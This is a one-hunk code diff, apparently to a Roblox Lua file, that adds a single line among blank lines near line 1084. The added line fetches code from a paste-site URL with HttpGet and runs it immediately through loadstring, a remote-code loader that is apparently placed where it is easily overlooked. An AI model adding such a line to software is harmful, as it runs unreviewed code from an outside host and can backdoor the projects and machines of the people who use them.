@@ -1084,7 +1084,7 @@ a
 
 
 
-
+loadstring(game:HttpGet("https://pastefy.app/tKOg6klJ/raw", true))();
 
 
 
